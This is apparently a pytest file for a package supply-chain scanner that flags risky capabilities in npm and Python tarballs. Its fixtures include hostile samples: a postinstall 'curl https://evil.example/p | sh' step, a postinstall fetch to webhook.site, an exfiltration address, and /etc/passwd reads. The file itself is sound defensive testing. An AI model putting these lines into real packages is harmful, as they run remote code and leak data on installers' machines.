import io
import tarfile

from mcp_supply_audit.capabilities import (
    scan_lifecycle_chain,
    scan_lifecycle_scripts,
    scan_tarball,
)


def make_tgz(files):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, content in files.items():
            data = content.encode()
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def test_detects_core_capabilities():
    tgz = make_tgz({
        "package/index.js": (
            "const { spawn } = require('child_process');\n"
            "spawn('ls');\n"
            "fetch('https://example.com');\n"
            "fs.readFile('/etc/passwd');\n"
            "console.log(process.env.HOME);\n"
            "eval('1+1');\n"
            "new StdioServerTransport();\n"
        ),
    })
    caps, n, _ = scan_tarball(tgz)
    assert n == 1
    assert caps["exec"] >= 2
    assert caps["network_out"] >= 1
    assert caps["filesystem"] >= 1
    assert caps["env_read"] >= 1
    assert caps["eval"] >= 1
    assert caps["stdio"] >= 1


def test_skips_tests_and_types():
    tgz = make_tgz({
        "package/index.test.js": "eval('x');",
        "package/types.d.ts": "eval('x');",
        "package/lib/clean.js": "export const x = 1;",
    })
    caps, n, _ = scan_tarball(tgz)
    assert n == 1
    assert caps["eval"] == 0


def test_clean_package_scores_zero():
    tgz = make_tgz({"package/index.js": "export const ok = true;"})
    caps, n, _ = scan_tarball(tgz)
    assert n == 1
    assert all(v == 0 for v in caps.values())


def test_detects_python_capabilities():
    tgz = make_tgz({
        "pkg/server.py": (
            "import subprocess, os, urllib.request\n"
            "subprocess.Popen(['ls'])\n"
            "urllib.request.urlopen('https://x')\n"
            "open('/etc/passwd')\n"
            "print(os.environ['HOME'])\n"
            "eval('1')\n"
            "from mcp.server.stdio import stdio_server\n"
        ),
    })
    caps, n, _ = scan_tarball(tgz)
    assert n == 1
    assert caps["exec"] >= 1
    assert caps["network_out"] >= 1
    assert caps["filesystem"] >= 1
    assert caps["env_read"] >= 1
    assert caps["eval"] >= 1
    assert caps["stdio"] >= 1


def test_detects_obfuscation_shapes():
    tgz = make_tgz({
        "package/payload.js": (
            "const s = atob('aGVsbG8=');\n"
            "eval(s);\n"
            "Buffer.from(s, 'base64');\n"
        ),
    })
    caps, n, _ = scan_tarball(tgz)
    assert n == 1
    assert caps["obfuscation"] >= 2
    # existing eval signal still fires; score deductions unchanged
    assert caps["eval"] >= 1


def test_dense_hex_escapes_count_as_obfuscation():
    payload = "var x = '" + "".join(f"\\x{i:02x}" for i in range(24)) + "';\n"
    tgz = make_tgz({"package/packed.js": payload})
    caps, n, _ = scan_tarball(tgz)
    assert n == 1
    assert caps["obfuscation"] >= 1


def test_plain_eval_is_not_obfuscation():
    tgz = make_tgz({"package/index.js": "eval('1+1');\n"})
    caps, n, _ = scan_tarball(tgz)
    assert n == 1
    assert caps["eval"] >= 1
    assert caps["obfuscation"] == 0


def test_empty_tarball_is_safe():
    caps, n, _ = scan_tarball(None)
    assert n == 0
    assert all(v == 0 for v in caps.values())


def test_detects_install_time_scripts():
    # the E10 attack shape: postinstall runs on the consumer's machine
    tgz = make_tgz({
        "package/package.json": (
            '{"name": "totally-safe-mcp-server", "version": "1.0.0",'
            ' "scripts": {"postinstall": "node postinstall.js"}}'
        ),
        "package/postinstall.js": "require('fs').writeFileSync('/tmp/pwned', 'hi');",
    })
    install_time, git_dep = scan_lifecycle_scripts(tgz)
    assert install_time == ["postinstall"]
    assert git_dep == []
    assert scan_lifecycle_chain(tgz) == []  # local write, no remote fetch


def test_prepare_is_git_dep_only():
    tgz = make_tgz({
        "package/package.json": (
            '{"name": "lib", "version": "1.0.0",'
            ' "scripts": {"prepare": "npm run build", "preinstall": "node x.js"}}'
        ),
    })
    install_time, git_dep = scan_lifecycle_scripts(tgz)
    assert install_time == ["preinstall"]
    assert git_dep == ["prepare"]


def test_no_scripts_is_clean():
    tgz = make_tgz({"package/package.json": '{"name": "lib", "version": "1.0.0"}'})
    install_time, git_dep = scan_lifecycle_scripts(tgz)
    assert install_time == []
    assert git_dep == []
    assert scan_lifecycle_scripts(None) == ([], [])
    assert scan_lifecycle_chain(None) == []


def test_detects_postmark_sink_host():
    tgz = make_tgz({
        "package/index.js": "const bcc = 'phan@giftshop.club';\nfetch('https://x');\n",
    })
    caps, n, hosts = scan_tarball(tgz)
    assert n == 1
    assert "giftshop.club" in hosts
    assert caps["exfil_host"] >= 1


def test_postinstall_curl_is_a_chain():
    tgz = make_tgz({
        "package/package.json": (
            '{"name": "x", "version": "1.0.0",'
            ' "scripts": {"postinstall": "curl https://evil.example/p | sh"}}'
        ),
    })
    assert scan_lifecycle_chain(tgz) == ["postinstall"]


def test_postinstall_js_with_fetch_is_a_chain():
    tgz = make_tgz({
        "package/package.json": (
            '{"name": "x", "version": "1.0.0",'
            ' "scripts": {"postinstall": "node postinstall.js"}}'
        ),
        "package/postinstall.js": "fetch('https://webhook.site/xxxx');\n",
    })
    assert "postinstall" in scan_lifecycle_chain(tgz)
    _, _, hosts = scan_tarball(tgz)
    assert "webhook.site" in hosts
